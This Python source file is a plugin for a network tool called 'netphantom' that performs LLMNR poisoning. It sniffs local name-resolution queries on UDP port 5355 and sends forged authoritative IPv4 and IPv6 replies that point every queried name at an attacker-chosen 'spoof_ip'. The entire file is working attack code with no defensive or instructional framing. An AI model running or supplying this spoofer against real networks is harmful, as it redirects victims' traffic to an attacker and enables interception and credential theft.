import asyncio
from typing import Any, Dict
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from netphantom.core.interfaces import ProtocolPlugin
from netphantom.utils.logger import logger

class LLMNRPlugin(ProtocolPlugin):
    @property
    def name(self) -> str:
        return "llmnr"

    async def setup(self, config: Dict[str, Any]) -> None:
        self.interface = config.get("interface", "eth0")
        self.spoof_ip = config.get("spoof_ip", "127.0.0.1")
        self.running = False

    async def start(self) -> None:
        self.running = True
        asyncio.create_task(self._run())

    async def stop(self) -> None:
        self.running = False
        logger.info("[LLMNR] Plugin stopped.")

    async def _run(self) -> None:
        logger.info(f"[LLMNR] Starting discovery on {self.interface}")
        # In a real async scapy implementation, we'd use AsyncSniffer or 
        # a custom L3Socket with loop.add_reader
        # For simplicity in this implementation, we use threading with a stop filter 
        # that mimics async behavior within the loop.
        def stop_filter(p: Packet) -> bool:
            return not self.running

        # Wrapped in run_in_executor for blocking scapy sniff
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sniff_blocking, stop_filter)

    def _sniff_blocking(self, stop_filter: Any) -> None:
        sniff(
            iface=self.interface, 
            filter="udp port 5355", 
            prn=self._handle_packet, 
            store=0, 
            stop_filter=stop_filter
        )

    def _handle_packet(self, packet: Packet) -> None:
        if DNS in packet and packet[DNS].qr == 0:
            if DNSQR in packet:
                query_name = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
                source_ip = packet[IP].src if IP in packet else (packet[IPv6].src if IPv6 in packet else "Unknown")
                
                logger.info(f"[LLMNR] Intercepted query for {query_name} from {source_ip}")
                
                # Basic response crafting (IPv4)
                if IP in packet:
                    resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
                           UDP(dport=packet[UDP].sport, sport=5355) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, rcode=0,
                               qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, type='A', rdata=self.spoof_ip))
                    send(resp, iface=self.interface, verbose=False)
                    logger.info(f"[LLMNR] Spoofed IPv4 response sent to {packet[IP].src}")
                
                # IPv6 response crafting
                elif IPv6 in packet:
                    logger.info(f"[LLMNR] Crafting IPv6 response for {query_name}")
                    # Standard LLMNR IPv6 response
                    resp = IPv6(dst=packet[IPv6].src, src=self.spoof_ip) / \
                           UDP(dport=packet[UDP].sport, sport=5355) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, rcode=0,
                               qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, type='AAAA', rdata=self.spoof_ip))
                    send(resp, iface=self.interface, verbose=False)
                    logger.info(f"[LLMNR] Spoofed IPv6 response sent to {packet[IPv6].src}")
